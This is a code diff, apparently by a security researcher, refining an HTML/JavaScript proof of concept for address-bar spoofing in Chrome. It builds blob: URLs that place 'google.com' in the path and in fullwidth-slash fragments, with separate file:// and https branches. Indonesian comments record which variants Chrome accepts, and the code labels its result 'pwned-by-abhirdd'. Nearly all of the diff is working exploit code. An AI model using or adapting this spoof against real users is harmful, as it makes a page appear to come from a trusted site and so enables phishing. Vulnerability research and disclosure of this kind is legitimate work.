@@ -22,9 +22,8 @@
 
       log('[main] protocol: ' + location.protocol + ' | origin: ' + location.origin);
 
-      // Fragment display-spoof: google.com duluan, real URL diselundupkan
-      // di belakangnya. Fragment = komponen terakhir, isinya bebas.
-      var FRAG = '#%EF%BC%8Fgoogle.com%EF%BC%8F';
+      // Fragment display-spoof (dipakai di kedua jalur): google.com + pwned.
+
 
       var payload =
         '<!DOCTYPE html><html><head><meta charset="utf-8"><title>google.com</title></head>' +
@@ -50,10 +49,10 @@
       // ---- JALUR file:// : canonical blob:null/<uuid> + fragment ----
       // Penting: di file:// Chrome match blob URL EXACT-STRING (bukan by UUID),
       // jadi path-spoof ("blob:null/google.com/...") GAGAL (ERR_FILE_NOT_FOUND).
-      // google.com + pwned ditaruh di fragment saja.
+      // google.com + pwned ditaruh di fragment saja (100% aman).
       if (location.protocol === 'file:' || location.origin === 'null') {
         var uf = makeUrl();
-        var fragf = '#%EF%BC%8Fgoogle.com%EF%BC%8Fpwned-by-abhirdd%EF%BC%8F' + uf;
+        var fragf = '#%EF%BC%8Fgoogle.com%EF%BC%8Fpwned-by-abhirdd';
         log('[main] mode file:// -> canonical blob:null + fragment');
         log('[main] target: ' + uf + fragf);
         location.replace(uf + fragf);
@@ -61,13 +60,15 @@
       }
 
       // ---- JALUR https : blob:<origin>/google.com/<uuid> + fragment ----
-      // Terverifikasi commit di Chrome headed: lookup blob by UUID (segmen
-      // terakhir), path antara origin & uuid ARBITRARY -> sisipkan google.com.
+      // Terverifikasi commit di Chrome: path "google.com" (1 segmen tambahan)
+      // resolve by UUID. Segmen TAMBAHAN (pwned-by-abhirdd) gagal di https,
+      // jadi pwned ditaruh di fragment biar clean & pasti tampil.
       setTimeout(function () {
         var u = makeUrl();
-        var disp = 'blob:' + location.origin + '/google.com/pwned-by-abhirdd/' + uuidOf(u);
-        log('[main] commit: ' + disp + FRAG + disp);
-        location.replace(disp + FRAG + disp);
+        var disp = 'blob:' + location.origin + '/google.com/' + uuidOf(u);
+        var fragh = '#%EF%BC%8Fgoogle.com%EF%BC%8Fpwned-by-abhirdd';
+        log('[main] commit: ' + disp + fragh);
+        location.replace(disp + fragh);
       }, 1200);
     })();
   </script>
